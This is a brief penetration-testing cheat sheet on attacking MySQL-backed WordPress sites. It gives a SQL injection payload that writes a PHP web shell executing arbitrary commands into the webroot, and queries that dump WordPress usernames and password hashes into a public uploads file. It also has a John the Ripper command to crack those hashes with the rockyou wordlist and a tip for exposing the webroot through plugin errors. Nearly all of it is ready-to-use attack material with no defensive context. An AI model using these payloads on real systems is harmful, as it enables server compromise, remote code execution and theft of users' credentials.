# Web Shell Cheatsheet

## MySQL: SQLi to PHPshell

```
' union select '<?php system($_GET["cmd"]); ?>', '' into outfile '/var/www/bd.php'#
```

## Wordpress to John

```
select concat_ws(':', user_login, user_pass) from wp_users;
select concat_ws(':', user_login, user_pass) from wp_users into outfile '/var/www/https/blogblog/wp-content/uploads/creds.txt';

john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

## Reveal Wordpress Webroot

Try to cause an error in a plugin, e.g. by calling it directly in the browser (`/wp-content/plugins/`)